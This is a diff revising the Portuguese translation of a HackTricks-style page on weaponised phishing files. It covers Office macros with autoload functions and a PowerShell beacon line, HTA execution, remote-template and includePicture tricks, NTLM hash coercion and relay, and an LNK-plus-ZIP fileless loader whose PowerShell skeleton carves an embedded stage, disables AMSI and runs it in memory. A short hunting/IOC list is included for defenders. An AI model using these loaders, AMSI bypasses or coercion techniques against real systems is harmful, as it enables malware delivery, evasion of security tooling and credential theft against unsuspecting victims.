@@ -1,25 +1,25 @@
-# Arquivos & Documentos de Phishing
+# Phishing Arquivos & Documentos
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Documentos do Office
 
-Microsoft Word realiza a validação dos dados do arquivo antes de abrir um arquivo. A validação dos dados é feita na forma de identificação da estrutura dos dados, em conformidade com o padrão OfficeOpenXML. Se ocorrer qualquer erro durante a identificação da estrutura dos dados, o arquivo sendo analisado não será aberto.
+Microsoft Word realiza a validação dos dados do arquivo antes de abrir um arquivo. A validação de dados é feita na forma de identificação da estrutura de dados, em conformidade com o padrão OfficeOpenXML. Se ocorrer qualquer erro durante a identificação da estrutura de dados, o arquivo em análise não será aberto.
 
-Normalmente, arquivos do Word que contêm macros usam a extensão `.docm`. No entanto, é possível renomear o arquivo alterando a extensão e ainda manter suas capacidades de execução de macros.\
+Geralmente, arquivos do Word que contêm macros usam a extensão `.docm`. No entanto, é possível renomear o arquivo alterando a extensão e ainda manter sua capacidade de execução de macros.\
 Por exemplo, um arquivo RTF não suporta macros, por design, mas um arquivo DOCM renomeado para RTF será tratado pelo Microsoft Word e será capaz de executar macros.\
-Os mesmos internos e mecanismos se aplicam a todo o software do Microsoft Office Suite (Excel, PowerPoint etc.).
+Os mesmos internals e mecanismos se aplicam a todo o software da Microsoft Office Suite (Excel, PowerPoint etc.).
 
 Você pode usar o seguinte comando para verificar quais extensões serão executadas por alguns programas do Office:
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-Arquivos DOCX que fazem referência a um template remoto (File –Options –Add-ins –Manage: Templates –Go) que inclui macros podem “executar” macros também.
+Arquivos DOCX que referenciam um template remoto (File –Options –Add-ins –Manage: Templates –Go) que inclui macros também podem “executar” macros.
 
-### Carregamento de Imagem Externa
+### Carregamento Externo de Imagem
 
-Ir para: _Insert --> Quick Parts --> Field_\
-_**Categorias**: Links e Referências, **Nomes de campo**: includePicture, e **Nome do arquivo ou URL**:_ http://<ip>/whatever
+Vá para: _Insert --> Quick Parts --> Field_\
+_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever
 
 ![](<../../images/image (155).png>)
 
@@ -29,7 +29,7 @@ _**Categorias**: Links e Referências, **Nomes de campo**: includePicture, e **N
 
 #### Funções Autoload
 
-Quanto mais comuns forem, maior a probabilidade de o AV detectá-las.
+Quanto mais comuns forem, maior a probabilidade de o AV detectá‑las.
 
 - AutoOpen()
 - Document_Open()
@@ -66,14 +66,14 @@ proc.Create "powershell <beacon line generated>
 ```
 #### Remover metadados manualmente
 
-Vá em **File > Info > Inspect Document > Inspect Document**, o que abrirá o Document Inspector. Clique em **Inspect** e depois em **Remove All** ao lado de **Document Properties and Personal Information**.
+Vá para **File > Info > Inspect Document > Inspect Document**, o que abrirá o Document Inspector. Clique em **Inspect** e depois em **Remove All** ao lado de **Document Properties and Personal Information**.
 
-#### Extensão do Documento
+#### Extensão do Doc
 
-When finished, select **Save as type** dropdown, change the format from **`.docx`** to **Word 97-2003 `.doc`**.\
-Faça isso porque você não pode salvar macro's dentro de um **`.docx`** e há um **stigma** **around** a extensão habilitada para macros **`.docm`** (por exemplo, o ícone em miniatura tem um grande `!` e alguns gateways web/email os bloqueiam completamente). Portanto, essa **extensão legada `.doc` é o melhor compromisso**.
+Ao terminar, selecione o menu suspenso **Save as type**, altere o formato de **`.docx`** para **Word 97-2003 `.doc`**.\
+Faça isso porque você não pode salvar macros dentro de um `.docx` e há um **estigma** **em torno** da extensão com macro habilitado **`.docm`** (por exemplo, o ícone em miniatura tem um grande `!` e alguns gateways web/email os bloqueiam completamente). Portanto, essa **extensão legada `.doc` é o melhor compromisso**.
 
-#### Geradores de Macros Maliciosos
+#### Geradores de Macros Maliciosas
 
 - MacOS
 - [**macphish**](https://github.com/cldrn/macphish)
@@ -81,9 +81,9 @@ Faça isso porque você não pode salvar macro's dentro de um **`.docx`** e há 
 
 ## Arquivos HTA
 
-Um HTA é um programa do Windows que **combina HTML e linguagens de script (como VBScript e JScript)**. Ele gera a interface do usuário e é executado como uma aplicação "totalmente confiável", sem as restrições do modelo de segurança de um browser.
+Um HTA é um programa do Windows que **combina HTML and scripting languages (such as VBScript and JScript)**. Ele gera a interface do usuário e é executado como uma aplicação "totalmente confiável", sem as restrições do modelo de segurança de um navegador.
 
-Um HTA é executado usando **`mshta.exe`**, que normalmente é **instalado** junto com o **Internet Explorer**, tornando **`mshta` dependente do IE**. Portanto, se ele tiver sido desinstalado, HTAs não poderão ser executados.
+Um HTA é executado usando **`mshta.exe`**, que normalmente vem **instalado** junto com o **Internet Explorer**, fazendo com que **`mshta` dependa do IE**. Portanto, se ele tiver sido desinstalado, HTAs não poderão ser executados.
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -138,9 +138,9 @@ var_func
 self.close
 </script>
 ```
-## Forçando Autenticação NTLM
+## Forçando a autenticação NTLM
 
-Existem várias maneiras de **forçar NTLM authentication "remotely"**, por exemplo, você pode adicionar **imagens invisíveis** em emails ou HTML que o usuário acessará (até mesmo HTTP MitM?). Ou enviar para a vítima o **endereço de arquivos** que irão **acionar** uma **autenticação** apenas ao **abrir a pasta.**
+Existem várias formas de **forçar a autenticação NTLM "remotely"**, por exemplo, você pode adicionar **imagens invisíveis** em emails ou HTML que o usuário irá acessar (até mesmo HTTP MitM?). Ou enviar para a vítima o **endereço de arquivos** que irão **disparar** uma **autenticação** apenas ao **abrir a pasta.**
 
 **Confira essas ideias e mais nas páginas a seguir:**
 
@@ -156,24 +156,24 @@ Existem várias maneiras de **forçar NTLM authentication "remotely"**, por exem
 
 ### NTLM Relay
 
-Não esqueça que você não pode apenas roubar o hash ou a autenticação, mas também realizar NTLM Relay attacks:
+Não esqueça que você pode não só roubar o hash ou a autenticação, mas também **perform NTLM relay attacks**:
 
 - [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
 - [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
 ## LNK Loaders + ZIP-Embedded Payloads (fileless chain)
 
-Campanhas altamente eficazes entregam um ZIP que contém dois documentos legítimos de isca (PDF/DOCX) e um .lnk malicioso. O truque é que o loader do PowerShell real é armazenado dentro dos bytes brutos do ZIP após um marcador único, e o .lnk recorta e o executa totalmente em memória.
+Campanhas altamente eficazes entregam um ZIP que contém dois documentos decoy legítimos (PDF/DOCX) e um .lnk malicioso. O truque é que o loader PowerShell real está armazenado nos bytes brutos do ZIP após um marcador único, e o .lnk o extrai e executa completamente em memória.
 
 Fluxo típico implementado pelo one-liner PowerShell do .lnk:
 
-1) Localizar o ZIP original em caminhos comuns: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, e o diretório pai do diretório de trabalho atual.
-2) Ler os bytes do ZIP e encontrar um marcador hardcoded (por exemplo, xFIQCV). Tudo após o marcador é o PowerShell payload embutido.
-3) Copiar o ZIP para %ProgramData%, extrair lá, e abrir o .docx de isca para parecer legítimo.
-4) Bypassar AMSI para o processo atual: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
-5) Deobfuscar a próxima etapa (por ex., remover todos os caracteres #) e executá-la em memória.
+1) Localizar o ZIP original em caminhos comuns: Desktop, Downloads, Documents, %TEMP%, %ProgramData% e o diretório pai do diretório de trabalho atual.  
+2) Ler os bytes do ZIP e encontrar um marcador hardcoded (por exemplo, xFIQCV). Tudo após o marcador é o PowerShell payload embutido.  
+3) Copiar o ZIP para %ProgramData%, extrair lá e abrir o .docx decoy para parecer legítimo.  
+4) Bypassar o AMSI para o processo atual: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
+5) Deobfuscate a próxima etapa (por exemplo, remover todos os caracteres #) e executá-la na memória.
 
-Exemplo de esqueleto PowerShell para extrair e executar a etapa embutida:
+Exemplo de skeleton PowerShell para carve e run a etapa embutida:
 ```powershell
 $marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
 $paths    = @(
@@ -191,21 +191,30 @@ $code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
 Invoke-Expression $code
 ```
 Notas
-- A entrega frequentemente abusa de subdomínios PaaS reputados (por exemplo, *.herokuapp.com) e pode filtrar payloads (servir ZIPs benignos com base em IP/UA).
-- A etapa seguinte frequentemente descriptografa base64/XOR shellcode e o executa via Reflection.Emit + VirtualAlloc para minimizar artefatos no disco.
+- A entrega frequentemente abusa de subdomínios PaaS reputáveis (por exemplo, *.herokuapp.com) e pode condicionar o acesso aos payloads (servir ZIPs benignos com base no IP/UA).
+- A próxima etapa frequentemente descriptografa base64/XOR shellcode e o executa via Reflection.Emit + VirtualAlloc para minimizar artefatos em disco.
 
 Persistência usada na mesma cadeia
-- COM TypeLib hijacking do Microsoft Web Browser control para que o IE/Explorer ou qualquer app que o incorpore re-execute o payload automaticamente. Veja detalhes e comandos prontos para uso aqui:
+- COM TypeLib hijacking of the Microsoft Web Browser control para que o IE/Explorer ou qualquer app que o incorpore reexecute o payload automaticamente. Veja detalhes e comandos prontos para uso aqui:
 
 {{#ref}}
 ../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
 {{#endref}}
 
 Hunting/IOCs
-- Arquivos ZIP contendo a string marcador ASCII (por exemplo, xFIQCV) acrescentada aos dados do arquivo.
-- .lnk que enumera pastas parent/user para localizar o ZIP e abre um documento de isca.
+- Arquivos ZIP contendo a string marcador ASCII (por exemplo, xFIQCV) anexada aos dados do arquivo.
+- .lnk que enumera pastas pai/usuário para localizar o ZIP e abre um documento de isca.
 - Manipulação do AMSI via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
-- Threads de negócios de longa duração que terminam com links hospedados em domínios PaaS confiáveis.
+- Threads de negócio de longa duração terminando com links hospedados em domínios PaaS confiáveis.
+
+## Arquivos do Windows para roubar hashes NTLM
+
+Consulte a página sobre **lugares para roubar credenciais NTLM**:
+
+{{#ref}}
+../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
+{{#endref}}
+
 
 ## Referências
 
